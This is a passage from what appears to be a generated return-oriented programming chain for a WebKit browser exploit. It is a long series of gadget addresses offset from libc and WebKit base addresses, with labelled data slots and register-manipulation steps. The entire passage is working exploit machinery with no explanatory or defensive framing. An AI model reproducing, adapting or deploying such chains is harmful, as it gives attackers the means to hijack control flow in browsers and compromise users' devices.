libc_base+792472 //pop rcx
]);
//L1298:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115256, //L1302
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1302:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1300:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1301:
db([27, 0]); // 0x1b
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+115360, //L1303
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+115376, //L1304
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1303:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1304:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+115464, //L1305
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115520, //L1307
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1307:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115592, //L1309
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1309:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115648, //L1311
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1311:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115736, //L1313
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1313:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1315:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+115856, //L1318
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115840, //L1316
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1316:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1318:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116000, //L1321
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115968, //L1319
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115984, //L1320
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1319:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1320:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1321:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116072, //L1322
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1322:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116128, //L1324
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1324:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116208, //L1328
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1328:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1326:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1327:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+116312, //L1329
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+116328, //L1330
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1329:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1330:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+116416, //L1331
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1331:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116472, //L1333
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1333:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116576, //L1335
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1335:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1337:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+116696, //L1340
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116680, //L1338
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1338:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+116840, //L1343
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+116808, //L1341
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+116824, //L1342
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1341:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1342:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1343:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+116912, //L1344
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1344:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+116968, //L1346
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1346:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117048, //L1350
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1350:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1348:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1349:
db([28, 0]); // 0x1c
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+117152, //L1351
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+117168, //L1352
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1351:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1352:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+117256, //L1353
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1353:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117312, //L1355
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1355:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117384, //L1357
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1357:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117440, //L1359
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1359:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1361:
webkit_base+1026352, //mov [rdi + 0x10], r9
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117576, //L1362
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1362:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1364:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+117696, //L1367
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117680, //L1365
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1365:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1367:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+117840, //L1370
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+117808, //L1368
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+117824, //L1369
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1368:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1369:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1370:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+117912, //L1371
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1371:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+117968, //L1373
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1373:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118048, //L1377
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1377:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1375:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1376:
db([29, 0]); // 0x1d
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+118152, //L1378
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+118168, //L1379
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1378:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1379:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+118256, //L1380
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1380:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118312, //L1382
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1382:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118384, //L1384
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1384:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118440, //L1386
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1386:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1388:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118576, //L1389
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1389:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1391:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+118696, //L1394
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118680, //L1392
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1392:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1394:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+118840, //L1397
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+118808, //L1395
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+118824, //L1396
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1395:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1396:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1397:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+118912, //L1398
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1398:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+118968, //L1400
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1400:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119048, //L1404
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1404:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1402:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1403:
db([30, 0]); // 0x1e
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+119152, //L1405
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+119168, //L1406
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1405:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1406:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+119256, //L1407
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1407:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119312, //L1409
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1409:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119384, //L1411
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1411:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119440, //L1413
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1413:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119528, //L1415
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1415:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1417:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+119648, //L1420
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119632, //L1418
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1418:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1420:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+119792, //L1423
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+119760, //L1421
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+119776, //L1422
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1421:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1422:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1423:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+119864, //L1424
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1424:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+119920, //L1426
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1426:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120000, //L1430
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1430:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1428:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1429:
db([7, 0]); // 0x7
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120104, //L1431
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120120, //L1432
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1431:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1432:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+120208, //L1433
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1433:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120264, //L1435
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1435:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120368, //L1437
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1437:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1439:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+120488, //L1442
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120472, //L1440
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1440:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+120632, //L1445
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+120600, //L1443
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120616, //L1444
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1443:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1444:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1445:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+120704, //L1446
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+120760, //L1448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1448:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+120840, //L1452
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1452:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1450:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1451:
db([31, 0]); // 0x1f
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+120944, //L1453
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+120960, //L1454
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+121048, //L1455
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1455:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121104, //L1457
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1457:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+121176, //L1459
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1459:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+121232, //L1461
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1461:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
